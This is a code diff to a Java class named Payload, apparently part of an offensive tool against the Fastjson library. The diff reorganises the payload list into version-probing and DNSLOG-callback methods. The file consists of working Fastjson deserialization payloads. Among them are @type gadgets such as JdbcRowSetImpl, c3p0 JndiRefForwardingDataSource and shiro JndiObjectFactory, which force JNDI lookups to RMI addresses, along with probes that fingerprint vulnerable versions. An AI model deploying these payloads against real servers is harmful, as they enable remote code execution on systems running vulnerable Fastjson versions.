@@ -8,20 +8,6 @@ public class Payload {
 
     public static List<Vulnerability> getPayload() {
         List<Vulnerability> vulnerabilities = new ArrayList<>();
-        vulnerabilities.add(new Vulnerability("Check Version -1", "【不报错】1.2.83/1.2.24 【报错】1.2.25-1.2.80", "{\"zero\":{\"@type\":\"java.lang.Exception\",\"@type\":\"org.XxException\"}}"));
-        vulnerabilities.add(new Vulnerability("Check Version -2", "【不报错】1.2.24-1.2.68 【报错】1.2.70-1.2.83", "{\"zero\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"}}"));
-        vulnerabilities.add(new Vulnerability("Check Version -3", "【不报错】1.2.24-1.2.47 【报错】1.2.48-1.2.83", "{\n" +
-                "    \"a\": {\n" +
-                "        \"@type\": \"java.lang.Class\", \n" +
-                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
-                "    }, \n" +
-                "    \"b\": {\n" +
-                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
-                "    }\n" +
-                "}"));
-        vulnerabilities.add(new Vulnerability("Check Version -4", "【不报错】1.2.24 【报错】1.2.25-1.2.83", "{\"zero\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"}}"));
-        vulnerabilities.add(new Vulnerability("DNSLOG -1", "替换DNSLOG地址，等待回显", "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog.com\"}}"));
-        vulnerabilities.add(new Vulnerability("DNSLOG -2", "替换DNSLOG地址，等待回显", "{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog.com\"}:\"a\"}"));
         vulnerabilities.add(new Vulnerability("Check 1222-1224 Jdbc", "JdbcRowSetImpl", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", \"autoCommit\":true}"));
         vulnerabilities.add(new Vulnerability("Check 1222-1224 c3p0", "c3p0#JndiRefForwardingDataSource", "{\"@type\":\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",\"jndiName\":\"rmi://127.0.0.1:1099/badClassName\", \"loginTimeout\":0}"));
         vulnerabilities.add(new Vulnerability("Check 1222-1224 shiro1", "shiro#JndiObjectFactory", "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\", \"resourceName\":\"rmi://127.0.0.1:9050/exploit\"}"));
@@ -468,6 +454,31 @@ public class Payload {
                 "}"));
         // 添加更多漏洞...
 
+        return vulnerabilities;
+    }
+    //探测dnslog
+    public static List<Vulnerability> getDnslog() {
+        List<Vulnerability> vulnerabilities = new ArrayList<>();
+        vulnerabilities.add(new Vulnerability("DNSLOG -1", "替换DNSLOG地址，等待回显", "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog.com\"}}"));
+        vulnerabilities.add(new Vulnerability("DNSLOG -2", "替换DNSLOG地址，等待回显", "{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog.com\"}:\"a\"}"));
+        return vulnerabilities;
+    }
+
+    //探测版本
+    public static List<Vulnerability> getVersion() {
+        List<Vulnerability> vulnerabilities = new ArrayList<>();
+        vulnerabilities.add(new Vulnerability("Check Version -1", "【不报错】1.2.83/1.2.24 【报错】1.2.25-1.2.80", "{\"zero\":{\"@type\":\"java.lang.Exception\",\"@type\":\"org.XxException\"}}"));
+        vulnerabilities.add(new Vulnerability("Check Version -2", "【不报错】1.2.24-1.2.68 【报错】1.2.70-1.2.83", "{\"zero\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"java.io.ByteArrayOutputStream\"}}"));
+        vulnerabilities.add(new Vulnerability("Check Version -3", "【不报错】1.2.24-1.2.47 【报错】1.2.48-1.2.83", "{\n" +
+                "    \"a\": {\n" +
+                "        \"@type\": \"java.lang.Class\", \n" +
+                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
+                "    }, \n" +
+                "    \"b\": {\n" +
+                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
+                "    }\n" +
+                "}"));
+        vulnerabilities.add(new Vulnerability("Check Version -4", "【不报错】1.2.24 【报错】1.2.25-1.2.83", "{\"zero\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\"}}"));
         return vulnerabilities;
     }
 }
